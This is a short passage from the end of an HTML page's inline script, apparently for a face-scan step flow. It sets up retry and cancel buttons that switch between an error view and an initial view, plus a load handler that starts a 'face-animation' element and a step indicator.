        retryBtn.addEventListener('click', function() {
            errorView.style.display = 'none';
            initialView.style.display = 'block';
        });
        
        // Cancel from error
        cancelErrorBtn.addEventListener('click', function() {
            errorView.style.display = 'none';
            initialView.style.display = 'block';
        });
        
        // Initialize
        window.addEventListener('load', function() {
            document.getElementById('face-animation').style.display = 'flex';
            updateStepIndicators(0);
        });
    </script>
</body>
</html>
